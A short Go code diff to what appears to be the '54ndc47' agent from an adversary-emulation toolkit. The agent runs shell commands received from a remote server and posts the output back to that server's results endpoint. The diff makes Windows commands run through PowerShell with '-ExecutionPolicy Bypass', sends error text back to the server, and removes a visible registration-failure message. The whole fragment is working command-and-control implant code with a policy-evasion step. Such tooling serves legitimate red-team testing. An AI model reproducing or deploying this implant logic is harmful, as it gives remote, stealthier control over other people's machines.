@@ -43,7 +43,7 @@ func makeRequest(address string, paw string, data []byte) map[string]interface{}
 
 func execute(command string) ([]byte, error) {
 	if runtime.GOOS == "windows" {
-		return exec.Command("cmd", "-C", command).Output()
+		return exec.Command("powershell.exe", "-ExecutionPolicy", "Bypass", "-C", command).Output()
 	} 
 	return exec.Command("sh", "-c", command).Output()
 }
@@ -66,6 +66,7 @@ func postResults(server string, paw string, command map[string]interface{}) map[
 	result, err := execute(cmd)
 	if err != nil {
 		status = "1"
+		result = []byte(err.Error())
 	}
 	address := fmt.Sprintf("%s/sand/results", server)
 	link := fmt.Sprintf("%f", command["id"].(float64))
@@ -92,7 +93,5 @@ func main() {
 			}
 			time.Sleep(time.Duration(commands["sleep"].(float64)) * time.Second)
 		}
-	} else {
-		fmt.Println("[54ndc47] registration failed")
 	}
 }
